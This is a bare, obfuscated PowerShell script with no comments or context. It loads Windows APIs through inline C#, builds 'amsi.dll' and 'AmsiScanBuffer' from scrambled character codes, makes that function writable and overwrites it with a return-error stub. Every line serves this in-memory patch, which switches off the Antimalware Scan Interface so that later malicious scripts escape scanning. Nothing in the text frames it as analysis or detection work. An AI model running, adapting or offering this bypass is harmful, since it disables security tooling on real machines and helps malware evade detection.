$eUXY7empNrwGj0 = @"
using System;
using System.Runtime.InteropServices;
public class eUXY7empNrwGj0 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr VUn4b2vbm, string wREkB);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr vBz2E, UIntPtr br1nh0k6ii6Mqp, uint iiEWyU, out uint S8icCAXyaBVl);
}
"@

Add-Type $eUXY7empNrwGj0

$tTSvh5s = [eUXY7empNrwGj0]::LoadLibrary("$([cHAr](97+79-79)+[cHAr]([byte]0x6d)+[chAR]([byTE]0x73)+[cHar]([BYTE]0x69)+[ChAr]([byTe]0x2e)+[char]([Byte]0x64)+[CHaR](8+100)+[cHAR]([bytE]0x6c))")
$oewwW = [eUXY7empNrwGj0]::GetProcAddress($tTSvh5s, "$([char](65)+[char](109*67/67)+[chaR](52+63)+[cHar]([Byte]0x69)+[cHaR]([bYtE]0x53)+[ChAr](99)+[cHAr](33+64)+[cHaR]([bYTe]0x6e)+[cHAR]([bytE]0x42)+[chAr]([Byte]0x75)+[CHaR]([byTE]0x66)+[char]([bYTE]0x66)+[ChAR](49+52)+[CHar](114+109-109))")
$p = 0
[eUXY7empNrwGj0]::VirtualProtect($oewwW, [uint32]5, 0x40, [ref]$p)
$Z6VSgJkuYslNV = "0xB8"
$r9t = "0x57"
$ShUa = "0x00"
$T1SeJh4NmcV = "0x07"
$diWwMQrC = "0x80"
$ovFW6z = "0xC3"
$FJDQf2m0ZRx0EG = [Byte[]] ($Z6VSgJkuYslNV,$r9t,$ShUa,$T1SeJh4NmcV,+$diWwMQrC,+$ovFW6z)
[System.Runtime.InteropServices.Marshal]::Copy($FJDQf2m0ZRx0EG, 0, $oewwW, 6)